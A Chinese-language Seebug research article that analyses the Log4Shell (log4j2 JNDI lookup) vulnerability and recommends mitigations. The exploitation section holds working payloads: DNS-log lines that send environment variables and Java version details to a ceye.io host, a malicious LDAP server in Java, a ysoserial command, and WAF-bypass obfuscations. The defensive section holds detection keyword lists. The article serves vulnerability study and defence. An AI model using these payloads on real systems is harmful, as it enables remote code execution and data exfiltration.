**作者：lxraa  
本文为作者投稿，Seebug Paper 期待你的分享，凡经采用即有礼品相送！ 投稿邮箱：paper@seebug.org**

# 一、漏洞分析

调试版本：2.14.1

### 1、漏洞触发点：

org.apache.logging.log4j.core.net.JndiManager:172

![image-20211214101057910](https://images.seebug.org/content/images/2021/12/15/1639560677000-image-20211214101057910.png-w331s)

调用栈：

![image-20211214101754598](https://images.seebug.org/content/images/2021/12/15/1639560678000-image-20211214101754598.png-w331s)

熟悉的lookup，因此log4shell如果要命令执行，需要利用jndi触发的反序列化漏洞，并不是单纯的rce，等价于：

    
    
    // name可控
    String name = "ldap://127.0.0.1:1333/#Exploit";
    Context ctx = new InitialContext();
    ctx.lookup(name);

### 2、代码分析

关键函数1：

org\apache\logging\log4j\core\lookup\StrSubstitutor.substitute

函数流程如下：

  * 找到String中的${}，将里面的变量拿出来解析

![image-20211214102857478](https://images.seebug.org/content/images/2021/12/15/1639560678000-image-20211214102857478.png-w331s)

其中prefixMatcher是一个StringMatcher继承自虚类StrMatcher，用来匹配字符串，后面多处用到，他的关键函数定义及作用是

/**

看buffer的pos处是否为指定字符串(初始化时指定，如prefixMatcher的指定字符串为"${")，如果是则返回字符串长度，否则返回0；

**/

`public abstract int isMatch(char[] buffer, int pos, int bufferStart, int
bufferEnd);`

  * 987行到1029行会对`:-`和`：\-`进行处理，与漏洞主要逻辑无关，但该处可以用来绕过waf，详见漏洞利用

![image-20211214105127950](https://images.seebug.org/content/images/2021/12/15/1639560678000-image-20211214105127950.png-w331s)

  * 1033行调用resolveVariable解析${}里弄出来的变量

关键函数2：

org\apache\logging\log4j\core\lookup\StrSubstitutor.resolveVariable

这个函数获取StrLookup对${}里的变量进行解析，StrLookup是个接口，Interpolator类间接实现了StrLookup:

    
    
    public class Interpolator extends AbstractConfigurationAwareLookup ...
    public abstract class AbstractConfigurationAwareLookup extends AbstractLookup implements ConfigurationAware ...
    public abstract class AbstractLookup implements StrLookup ...

它的lookup方法通过`:`前的PREFIX，从Interpolator的一个私有hashmap里决定分配给哪个具体的Lookup处理变量，所有支持的PREFIX有：

![image-20211214135924004](https://images.seebug.org/content/images/2021/12/15/1639560678000-image-20211214135924004.png-w331s)

对应所有接口的实现在org\apache\logging\log4j\core\lookup\包：

![image-20211214140052387](https://images.seebug.org/content/images/2021/12/15/1639560678000-image-20211214140052387.png-w331s)

  * 各StrLookup接口实现功能分析：

关键函数是`lookup(final LogEvent event,final String key);`

date：格式化时间：

![image-20211214144008892](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214144008892.png-w331s)

java：输出本地java语言相关信息：

![image-20211214144422831](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214144422831.png-w331s)

marker：从event的marker中获取信息，暂不清楚做什么用

![image-20211214145008642](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214145008642.png-w331s)

ctx：从event的contextData(一个map)中取value

![image-20211214145216452](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214145216452.png-w331s)

lower：取小写

upper：取大写

jndi：等价与

    
    
        // name可控
        String name = "xxx";
        Context ctx = new InitialContext();
        ctx.lookup(name);

main：从内存某个map里获取value

![image-20211214154734490](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214154734490.png-w331s)

jvmrunargs：本意好像是从jvm参数中获取参数，调试中发现初始化的map和strLookupMap中的map不是同一个，原因未知

![image-20211214160839980](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214160839980.png-w331s)

![image-20211214163401573](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214163401573.png-w331s)

![image-20211214163444744](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214163444744.png-w331s)

sys：等价于`System.getProperty(xxx)`

![image-20211214164401376](https://images.seebug.org/content/images/2021/12/15/1639560679000-image-20211214164401376.png-w331s)

env：等价于`System.env`获取环境变量，可以如下图所示列出本地所有的环境变量

![image-20211214164923627](https://images.seebug.org/content/images/2021/12/15/1639560680000-image-20211214164923627.png-w331s)

log4j：支持configLocation和configParentLocation两个key，当存在log4j2.xml配置文件时，可以获取该文件的绝对路径，和上级文件夹的绝对路径

![image-20211214165632942](https://images.seebug.org/content/images/2021/12/15/1639560680000-image-20211214165632942.png-w331s)

![image-20211214165751950](https://images.seebug.org/content/images/2021/12/15/1639560680000-image-20211214165751950.png-w331s)

# 二、漏洞利用

### 1、漏洞探测

常规方法，可以利用dns log探测漏洞是否存在，例：利用ceye探测漏洞是否存在：

    
    
    logger.error("${jndi:ldap://****.ceye.io/}");

### 2、信息收集

利用sys、env等lookup+dnslog，进行利用环境的信息收集（由于域名中不能存在某些特殊字符，因此不是所有的环境变量都可以利用dnslog带出来），以下是部分windows下利用的payload：

    
    
    logger.error("${jndi:ldap://${env:OS}.vwva2y.ceye.io/}"); //系统版本
    logger.error("${jndi:ldap://${env:USERNAME}.vwva2y.ceye.io/}");//用户名
    logger.error("${jndi:ldap://${sys:java.version}.vwva2y.ceye.io/}");//java版本，这个比较关键，因为jndi注入的payload高度依赖于java版本
    logger.error("${jndi:ldap://${sys:os.version}.vwva2y.ceye.io/}");//系统版本
    logger.error("${jndi:ldap://${sys:user.timezone}.vwva2y.ceye.io/}");//时区
    logger.error("${jndi:ldap://${sys:file.encoding}.vwva2y.ceye.io/}");//文件编码
    logger.error("${jndi:ldap://${sys:sun.cpu.endian}.vwva2y.ceye.io/}");//cpu大端or小端
    logger.error("${jndi:ldap://${sys:sun.desktop}.vwva2y.ceye.io/}");//系统版本
    logger.error("${jndi:ldap://${sys:sun.cpu.isalist}.vwva2y.ceye.io/}");//cpu指令集

### 3、RCE

log4shell的RCE基本等于jndi注入，log4shell可以探测jdk版本，可以根据实际环境选择适当的方法进行rce。jndi注入的利用姿势可以参考：

<https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html>

以下以1.8.0_261版本下的rce为例：

由于8u191+的jdk不再信任远程加载的类，本例使用ldap
entry的javaSerializedData属性的反序列化触发本地的Gadget，利用条件是工程有commons-collections依赖，版本需
<=3.2.1（ysoserial说需小于3.1，实测3.2.1及以下均可使用）

  * 使用ysoserial生成base64 payload（使用windows的同学注意powershell生成可能会有问题，请使用cmd生成）

    
    
      java -jar .\ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 "calc" |base64 > pp.txt

  * 构造恶意LDAP服务器，参考了marshalsec

    
    
      package com.lxraa.test.jndi;
    
      import java.io.FileInputStream;
      import java.io.IOException;
      import java.net.InetAddress;
      import java.net.URL;
      import javax.net.ServerSocketFactory;
      import javax.net.SocketFactory;
      import javax.net.ssl.SSLSocketFactory;
    
      import com.twitter.chill.Base64;
      import com.unboundid.ldap.listener.InMemoryDirectoryServer;
      import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
      import com.unboundid.ldap.listener.InMemoryListenerConfig;
      import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
      import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
      import com.unboundid.ldap.sdk.Entry;
      import com.unboundid.ldap.sdk.LDAPException;
      import com.unboundid.ldap.sdk.LDAPResult;
      import com.unboundid.ldap.sdk.ResultCode;
    
    
      public class LDAPServer {
    
          private static final String LDAP_BASE = "dc=example,dc=com";
    
    
          public static void main (String[] args) {
              int port = 1333;
              String url = "http://127.0.0.1:3000/#Exploit";
              try {
                  InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
                  config.setListenerConfigs(new InMemoryListenerConfig(
                          "listen", //$NON-NLS-1$
                          InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                          port,
                          ServerSocketFactory.getDefault(),
                          SocketFactory.getDefault(),
                          (SSLSocketFactory) SSLSocketFactory.getDefault()));
    
                  config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
                  InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
                  System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
                  ds.startListening();
    
              }
              catch ( Exception e ) {
                  e.printStackTrace();
              }
          }
    
          private static class OperationInterceptor extends InMemoryOperationInterceptor {
    
              private URL codebase;
    
    
    
              public OperationInterceptor ( URL cb ) {
                  this.codebase = cb;
              }
    
    
              @Override
              public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
                  String base = result.getRequest().getBaseDN();
                  Entry e = new Entry(base);
                  try {
                      sendResult(result, base, e);
                  }
                  catch ( Exception e1 ) {
                      e1.printStackTrace();
                  }
    
              }
    
    
              protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, IOException {
                  URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
                  System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
                  e.addAttribute("javaClassName", "th3wind");
                  String cbstring = this.codebase.toString();
                  int refPos = cbstring.indexOf('#');
                  if ( refPos > 0 ) {
                      cbstring = cbstring.substring(0, refPos);
                  }
    
    
    
                  byte[] bytes2 = Base64.decode("**************");
    
                  e.addAttribute("javaCodeBase", cbstring);
                  e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
                  e.addAttribute("javaFactory", this.codebase.getRef());
                  e.addAttribute("javaSerializedData", bytes2);
                  result.sendSearchEntry(e);
                  result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
              }
    
          }
      }

  * poc：

    
    
      logger.error("${jndi:ldap://127.0.0.1:1333/#Exploit}");

![image-20211215091739638](https://images.seebug.org/content/images/2021/12/15/1639560680000-image-20211215091739638.png-w331s)

### 4、payload变形

  * 利用本身的lookup`${lower:J}`

    
    
      logger.error("${${lower:J}ndi:ldap://127.0.0.1:1333/#Exploit}");

  * 利用substitute的解析问题，前文提到关键代码在987行到1029行

![image-20211215092935474](https://images.seebug.org/content/images/2021/12/15/1639560680000-image-20211215092935474.png-w331s)

总结一下就是截取:-后面的部分，如果存在多个:-则以第一个为准，例如：

    
    
    func("asdasdasdasd:-x") = "x";
    func("asdasdasdasd:-asdasdasd:-x") = "asdasdasd:-x"

如果lookup返回null，则把该${}块替换为这样处理后的字符串，因此可以构造payload：

    
    
    logger.error("${${anychars:-j}ndi:ldap://127.0.0.1:1333/#Exploit}");
    logger.error("${${anychars:-j}ndi${anychars:-:}ldap://127.0.0.1:1333/#Exploit}"); //特殊字符也可替换

# 三、修复建议

### 1、waf（缓解措施，不能保证过滤全部攻击包

*仅提供思路，不保证正则性能，请根据实际生产情况优化

过滤思路：

①如果不存在`\$\{(.*):-(.*)\}`，则攻击包中必存在连续关键字，直接过滤所有log4j2支持的lookup：

    
    
    ${date:
    ${java:
    ${marker:
    ${ctx:
    ${lower:
    ${upper:
    ${jndi:
    ${main:
    ${jvmrunargs:
    ${sys:
    ${env:
    ${log4j:

② 如果存在`\$\{(.*):-(.*)\}`，则文中可能不存在连续关键字，如`${${xxxxx:-l}ower:}`

，但是log4j2语法只支持大小写转换，不会有编码及替换，因此关键字词序不变，且最多存在大小写混淆，可使用：

    
    
    // 其他lookup同理
    \$(.*?)\{(.*?)[jJ](.*?)[nN](.*?)[dD](.*?)[iI](.*?):

### 2、网络层控制（缓解措施

禁止非必须出向流量

### 3、升级JDK（缓解措施

高版本JDK的jndi注入利用难度相对较大

### 4、排除非必须反序列化Gadget（缓解措施

参照ysoserial说明文档

    
    
         Payload             Authors                                Dependencies
         -------             -------                                ------------         AspectJWeaver       @Jang                                  aspectjweaver:1.9.2, commons-collections:3.2.2
         BeanShell1          @pwntester, @cschneider4711            bsh:2.0b5
         C3P0                @mbechler                              c3p0:0.9.5.2, mchange-commons-java:0.2.11
         Click1              @artsploit                             click-nodeps:2.3.0, javax.servlet-api:3.1.0
         Clojure             @JackOfMostTrades                      clojure:1.8.0
         CommonsBeanutils1   @frohoff                               commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2
         CommonsCollections1 @frohoff                               commons-collections:3.1
         CommonsCollections2 @frohoff                               commons-collections4:4.0
         CommonsCollections3 @frohoff                               commons-collections:3.1
         CommonsCollections4 @frohoff                               commons-collections4:4.0
         CommonsCollections5 @matthias_kaiser, @jasinner            commons-collections:3.1
         CommonsCollections6 @matthias_kaiser                       commons-collections:3.1
         CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1
         FileUpload1         @mbechler                              commons-fileupload:1.3.1, commons-io:2.4
         Groovy1             @frohoff                               groovy:2.3.9
         Hibernate1          @mbechler
         Hibernate2          @mbechler
         JBossInterceptors1  @matthias_kaiser                       javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
         JRMPClient          @mbechler
         JRMPListener        @mbechler
         JSON1               @mbechler                              json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
         JavassistWeld1      @matthias_kaiser                       javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21
         Jdk7u21             @frohoff
         Jython1             @pwntester, @cschneider4711            jython-standalone:2.5.2
         MozillaRhino1       @matthias_kaiser                       js:1.7R2
         MozillaRhino2       @_tint0                                js:1.7R2
         Myfaces1            @mbechler
         Myfaces2            @mbechler
         ROME                @mbechler                              rome:1.0
         Spring1             @frohoff                               spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE
         Spring2             @mbechler                              spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2
         URLDNS              @gebl
         Vaadin1             @kai_ullrich                           vaadin-server:7.7.14, vaadin-shared:7.7.14
         Wicket1             @jacob-baines                          wicket-util:6.23.0, slf4j-api:1.6.4

### 5、配置关闭lookup功能（缓解措施

  * 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups=true

  * 修改配置 log4j2.formatMsgNoLookups=True

注意：2.10以前版本修改jvm参数无效的

### 6、升级log4j2版本到2.16.0+

注意依赖包里可能存在有漏洞的log4j-api和log4j-core，需一并排查

![image-20211215103012092](https://images.seebug.org/content/images/2021/12/15/1639560680000-image-20211215103012092.png-w331s)

![image-20211215103230474](https://images.seebug.org/content/images/2021/12/15/1639560680000-image-20211215103230474.png-w331s)

参考文章：

<https://mp.weixin.qq.com/s/Yq9k1eBquz3mM1sCinneiA>

<https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html>

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1788/>

